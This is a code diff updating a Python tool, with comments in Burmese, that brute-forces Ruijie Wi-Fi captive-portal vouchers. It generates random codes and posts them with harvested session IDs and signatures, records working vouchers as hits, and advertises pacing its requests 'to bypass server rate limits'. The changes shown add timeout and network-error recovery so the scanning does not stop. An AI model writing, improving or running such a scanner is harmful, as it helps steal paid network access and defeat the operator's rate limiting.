@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-Ruijie Voucher Scanner v18.4 - SKY BLUE EDITION (DUAL COMPACT UI)
-- Premium Animated UI Design
-- Dual Code Display (Left & Right simultaneous)
+Ruijie Voucher Scanner v18.5 - SKY BLUE EDITION (ANTI-FREEZE)
+- Auto-Recovery System (Network Drop Protection)
+- Dual Code Display
 - Slow & Steady to bypass server rate limits
 """
 
@@ -35,16 +35,16 @@ from rich.box import HEAVY, ROUNDED, DOUBLE, MINIMAL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ==========================================
-# ⚙️ SLOW & STEADY TUNING
+# ⚙️ TUNING (ANTI-FREEZE)
 # ==========================================
-CONCURRENCY = 2           # ကုဒ် ၂ ခု တစ်ပြိုင်နက်တည်း စစ်မယ်
-TIMEOUT = 8
+CONCURRENCY = 2           
+TIMEOUT = 10              # Network drop အတွက် အချိန်ပိုပေးထားတယ်
 SID_POOL_MAX = 100
 SID_FETCHER_COUNT = 5
 SID_FETCH_SLEEP = 0.5
-DIRECT_TIMEOUT = 5
-WORKER_SID_TIMEOUT = 2.0
-REQUEST_DELAY = 0.5       # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း 0.5 စက္ကန့် နားမယ်
+DIRECT_TIMEOUT = 10
+WORKER_SID_TIMEOUT = 3.0
+REQUEST_DELAY = 0.5       # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း ခဏနားမယ်
 
 console = Console()
 
@@ -208,14 +208,9 @@ class VoucherScanner:
         elif self.mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=self.length))
         return "0" * self.length
 
-    # ==========================================
-    # 🎨 COMPACT UI LAYOUT
-    # ==========================================
     def make_layout(self):
         s = self._state
         layout = Layout()
-        
-        # UI အပိုင်းတွေကို ပိုပြီး ကျစ်လျစ်အောင် လျှော့ချထားတယ်
         layout.split_column(
             Layout(name="header", size=3),
             Layout(name="stats", size=3),
@@ -224,11 +219,9 @@ class VoucherScanner:
             Layout(name="hits", ratio=1),
         )
 
-        # 1. Header
-        header_text = Text("☁️ SKY BLUE SCANNER v18.4 - DUAL ☁️", style="bold white on sky_blue1", justify="center")
+        header_text = Text("☁️ SKY BLUE SCANNER v18.5 - ANTI-FREEZE ☁️", style="bold white on sky_blue1", justify="center")
         layout["header"].update(Panel(header_text, border_style="sky_blue1", box=ROUNDED))
 
-        # 2. Stats
         speed = s['speed']
         speed_style = "bold green" if speed >= 100 else "bold red"
         stats_table = Table.grid(padding=0, expand=True)
@@ -241,7 +234,6 @@ class VoucherScanner:
         )
         layout["stats"].update(Panel(stats_table, border_style="dim", box=MINIMAL))
 
-        # 3. Progress
         pct = s['percentage']
         progress_text = Text.assemble(
             (f"[{pct:.1f}%] ", "bold cyan"), 
@@ -249,7 +241,6 @@ class VoucherScanner:
         )
         layout["progress"].update(Panel(progress_text, border_style="dim", box=MINIMAL))
 
-        # 4. Codes (ဘေးချင်းယှဉ် ကုဒ် ၂ ခု)
         codes_table = Table.grid(padding=(0, 1), expand=True)
         codes_table.add_column(ratio=1, justify="center")
         codes_table.add_column(ratio=1, justify="center")
@@ -259,7 +250,6 @@ class VoucherScanner:
         )
         layout["codes"].update(Panel(codes_table, title="[dim]Scanning Codes[/dim]", border_style="cyan", box=ROUNDED))
 
-        # 5. Hits Dashboard
         hits_table = Table(show_header=True, header_style="bold white on sky_blue1", expand=True, box=MINIMAL)
         hits_table.add_column("TYPE", width=8, justify="center")
         hits_table.add_column("VOUCHER", justify="center")
@@ -269,7 +259,7 @@ class VoucherScanner:
         for v, t, _url, tl in s['found']: all_hits.append(("FOUND", v, tl))
         for v, t, tl in s['valid']: all_hits.append(("VALID", v, tl))
         
-        for kind, v, tl in all_hits[-15:]: # နေရာပိုရအောင် ၁၅ ခုအထိ ပြမယ်
+        for kind, v, tl in all_hits[-15:]:
             style = "bold green" if kind == "FOUND" else "bold cyan"
             hits_table.add_row(f"[{style}]{kind}[/]", v, tl or "-")
 
@@ -295,6 +285,7 @@ class VoucherScanner:
         elif kind == "VALID": self._state['valid'].append((voucher, clock, tl))
         elif kind in ("STA_LIMIT", "EXPIRED"): self._state['dead'].append((voucher, clock, kind))
 
+    # 🛡️ ကွန်ရက်ပြတ်လည်း ဆက်အလုပ်လုပ်မယ့် SID Fetcher
     async def sid_fetcher(self, session):
         while not self._stop:
             try:
@@ -329,15 +320,14 @@ class VoucherScanner:
                                     'sign': q.get('sign', [None])[0], 'ts': q.get('timestamp', [None])[0], 'used': 0
                                 })
                                 self._state['sid_pool'] = self.sid_pool.qsize()
-                except: pass
+                except Exception: 
+                    pass # Error တက်လည်း ဆက်လုပ်မယ်
 
             except Exception:
                 pass
             await asyncio.sleep(SID_FETCH_SLEEP)
 
-    # ==========================================
-    # 🔥 DUAL SCAN WORKER (တစ်ခုနဲ့တစ်ခု မရောအောင် ခွဲထားတယ်)
-    # ==========================================
+    # 🛡️ ကွန်ရက်ပြတ်လည်း ရပ်မသွားမယ့် Scan Worker
     async def scan_worker(self, session, worker_id):
         while not self._stop:
             try:
@@ -356,7 +346,6 @@ class VoucherScanner:
                 self._state['workers'] += 1
                 self._state['status'] = "Scanning..."
 
-                # Worker 1 က Code 1 မှာ၊ Worker 2 က Code 2 မှာ သီးသန့်ပြမယ်
                 if worker_id == 1:
                     self._state['current_code_1'] = voucher
                 else:
@@ -379,6 +368,7 @@ class VoucherScanner:
                 logon = ""
 
                 try:
+                    # Network timeout ကို ကာကွယ်ထားတယ်
                     async with session.post(url, json=payload, headers=headers, proxy=None, ssl=False, timeout=TIMEOUT, allow_redirects=True) as resp:
                         text = await resp.text()
                         
@@ -401,15 +391,21 @@ class VoucherScanner:
                                 status = 'FOUND' if logon else 'VALID'
                                 tl = parse_remaining_time(result)[0] or ""
 
+                except asyncio.TimeoutError:
+                    status = 'TIMEOUT' # ကွန်ရက်နှေးနေတာ
+                except aiohttp.ClientError:
+                    status = 'NET_ERROR' # ကွန်ရက်ပြတ်တာ
                 except Exception:
                     status = 'DEAD_SID'
 
                 self._state['checked'] += 1
 
-                if status in ('DEAD_SID', 'INVALID'):
+                if status in ('DEAD_SID', 'INVALID', 'TIMEOUT', 'NET_ERROR'):
                     if status == 'INVALID':
                         sid_data['used'] += 1
                         if sid_data['used'] < 10: await self.sid_pool.put(sid_data)
+                    elif status in ('TIMEOUT', 'NET_ERROR'):
+                        self._state['status'] = "⚠️ Network unstable, retrying..."
                 else:
                     if not self.sid_pool.full(): await self.sid_pool.put(sid_data)
                     self._record_hit(voucher, status, logon, tl)
@@ -417,7 +413,6 @@ class VoucherScanner:
                 if not self._stop:
                     await self.voucher_queue.put(self.generate_voucher())
 
-                # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း ခဏနားမယ်
                 await asyncio.sleep(REQUEST_DELAY)
 
             except asyncio.CancelledError:
@@ -441,8 +436,6 @@ class VoucherScanner:
         ui_task = asyncio.create_task(self._ui_loop())
 
         sid_tasks = [asyncio.create_task(self.sid_fetcher(session)) for _ in range(SID_FETCHER_COUNT)]
-        
-        # Worker 1 နဲ့ Worker 2 ကို သီးသန့် ခွဲထားတယ်
         scan_tasks = [
             asyncio.create_task(self.scan_worker(session, worker_id=1)),
             asyncio.create_task(self.scan_worker(session, worker_id=2))
